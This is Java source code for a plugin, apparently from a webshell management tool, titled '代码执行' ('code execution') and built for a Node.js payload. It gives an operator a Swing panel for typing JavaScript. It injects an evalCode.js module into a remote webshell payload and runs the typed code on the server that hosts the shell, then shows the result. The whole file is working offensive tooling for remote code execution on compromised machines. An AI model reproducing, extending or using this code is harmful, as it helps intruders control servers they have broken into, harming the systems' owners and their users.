package shells.plugins.nodejs;


import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;

import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.border.TitledBorder;

import org.fife.ui.rtextarea.RTextScrollPane;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
        payloadName = "NodeJsDynamicPayload",
        Name = "EvalCode",
        DisplayName = "代码执行"
)
public class NodeJsEvalCode implements Plugin {
    private static final String CLASS_NAME = "NodeJs_Eval_Code";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea codeTextArea = new RTextArea();
    private final JButton runButton = new JButton("Run");
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public NodeJsEvalCode() {
        JSplitPane pane1 = new JSplitPane();
        JSplitPane pane2 = new JSplitPane();
        JPanel runButtonPanel = new JPanel(new FlowLayout());
        runButtonPanel.add(this.runButton);
        this.codeTextArea.setBorder(new TitledBorder("code"));
        this.resultTextArea.setBorder(new TitledBorder("result"));
        this.codeTextArea.setText("(function () {\n" +
                "    return (1 + 1);\n" +
                "})()");
        RTextScrollPane scrollPane = new RTextScrollPane(this.codeTextArea, true);
        scrollPane.setIconRowHeaderEnabled(true);
        scrollPane.getGutter().setBookmarkingEnabled(true);
        pane1.setOrientation(1);
        pane1.setLeftComponent(scrollPane);
        pane1.setRightComponent(runButtonPanel);
        pane2.setOrientation(1);
        pane2.setLeftComponent(pane1);
        pane2.setRightComponent(new RTextScrollPane(this.resultTextArea));
        this.panel.add(pane2);
        UiFunction.setSyntaxEditingStyle(this.codeTextArea, "eval.js");
        this.resultTextArea.registerReplaceDialog();
    }

    private void Load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/evalCode.js");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("NodeJs_Eval_Code", data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                } else {
                    Log.error("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        } else {
            GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }

    }

    private void runButtonClick(ActionEvent actionEvent) {
        String code = this.codeTextArea.getText();
        if (code != null && code.trim().length() > 0) {
            String resultString = this.eval(code);
            this.resultTextArea.setText(resultString);
        } else {
            GOptionPane.showMessageDialog(this.panel, "code is null", "提示", 2);
        }

    }

    public String eval(String code) {
        return this.eval(code, new ReqParameter());
    }

    public String eval(String code, ReqParameter reqParameter) {
        reqParameter.add("plugin_eval_code", code);
        if (!this.loadState) {
            this.Load();
        }

        String resultString = this.encoding.Decoding(this.payload.evalFunc("NodeJs_Eval_Code", "run", reqParameter));
        return resultString;
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
